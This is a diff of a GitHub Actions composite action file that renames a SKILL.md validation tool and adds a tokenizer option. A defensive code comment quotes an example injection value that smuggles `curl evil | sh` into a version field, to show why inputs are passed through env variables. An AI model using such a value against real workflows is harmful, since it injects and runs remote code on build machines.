@@ -1,4 +1,4 @@
-name: "skillcheck"
+name: "TraceMantle"
 description: "Cross-agent skill quality gate for SKILL.md files. Validates against the agentskills.io specification."
 author: "Brad Kinnard (moonrunnerkc), Aftermath Technologies Ltd"
 
@@ -7,12 +7,16 @@ branding:
   color: "green"
 
 inputs:
+  tokenizer:
+    description: "Token backend: heuristic (offline) or tiktoken (cold cache may download)."
+    required: false
+    default: "heuristic"
   path:
     description: "Path to a SKILL.md file or directory to scan recursively."
     required: false
     default: "."
   version:
-    description: "skillcheck version to install from PyPI (e.g., '1.4.1'). Leave empty to install from the action's own checkout."
+    description: "tracemantle version to install from PyPI (e.g., '1.6.0'). Leave empty to install from the action's own checkout."
     required: false
     default: ""
   min-desc-score:
@@ -84,7 +88,7 @@ inputs:
     required: false
     default: ""
   history:
-    description: "Append a validation record to .skillcheck-history.json."
+    description: "Write an immutable validation record outside the skill bundle."
     required: false
     default: "false"
   fail-on-regression:
@@ -112,13 +116,14 @@ runs:
       with:
         python-version: "3.12"
 
-    - name: Install and run skillcheck
+    - name: Install and run tracemantle
       shell: bash
       # Inputs are passed through env so their values never expand into the
       # script source. Referencing them as "$INPUT_*" keeps a value like
       # `1.0" ; curl evil | sh ; echo "` an inert string instead of injected
       # shell. Do NOT reference ${{ inputs.* }} directly inside this run block.
       env:
+        INPUT_TOKENIZER: ${{ inputs.tokenizer }}
         INPUT_VERSION: ${{ inputs.version }}
         INPUT_TIKTOKEN: ${{ inputs.tiktoken }}
         INPUT_PATH: ${{ inputs.path }}
@@ -146,21 +151,21 @@ runs:
       run: |
         # Install strategy:
         # 1. INPUT_VERSION set -> pin to that PyPI version (covers the rare
-        #    case of running an older skillcheck against newer action sources).
+        #    case of running an older tracemantle against newer action sources).
         # 2. INPUT_VERSION empty AND $GITHUB_ACTION_PATH/pyproject.toml present
         #    -> install from the action's own checkout. This is how composite
         #    actions are laid out by actions/checkout: the tag the user wrote in
         #    `uses:` is checked out into $GITHUB_ACTION_PATH, so installing from
-        #    there pins skillcheck to that tag's source and closes any PyPI/tag
+        #    there pins tracemantle to that tag's source and closes any PyPI/tag
         #    drift. `uses: ./` dogfood jobs also resolve here.
         # 3. Otherwise fall back to the PyPI range. This only fires in edge cases
         #    where $GITHUB_ACTION_PATH does not contain a checkout (e.g. a
         #    user-built container that drops the action sources).
         if [ -n "$INPUT_VERSION" ]; then
           if [ "$INPUT_TIKTOKEN" = "true" ]; then
-            pip install --quiet "skillcheck[tiktoken]==$INPUT_VERSION"
+            pip install --quiet "tracemantle[tiktoken]==$INPUT_VERSION"
           else
-            pip install --quiet "skillcheck==$INPUT_VERSION"
+            pip install --quiet "tracemantle==$INPUT_VERSION"
           fi
         elif [ -f "${GITHUB_ACTION_PATH}/pyproject.toml" ]; then
           if [ "$INPUT_TIKTOKEN" = "true" ]; then
@@ -170,15 +175,16 @@ runs:
           fi
         else
           if [ "$INPUT_TIKTOKEN" = "true" ]; then
-            pip install --quiet "skillcheck[tiktoken]>=1.2,<2"
+            pip install --quiet "tracemantle[tiktoken]>=1.6,<2"
           else
-            pip install --quiet "skillcheck>=1.2,<2"
+            pip install --quiet "tracemantle>=1.6,<2"
           fi
         fi
 
         args=()
         args+=("$INPUT_PATH")
         args+=("--format" "$INPUT_FORMAT")
+        args+=("--tokenizer" "$INPUT_TOKENIZER")
 
         [ "$INPUT_STRICT_VSCODE" = "true" ] && args+=("--strict-vscode")
         [ "$INPUT_STRICT_CURSOR" = "true" ] && args+=("--strict-cursor")
@@ -204,4 +210,4 @@ runs:
           [ -n "$p" ] && args+=("--ignore" "$(echo "$p" | xargs)")
         done
 
-        skillcheck "${args[@]}"
+        tracemantle "${args[@]}"
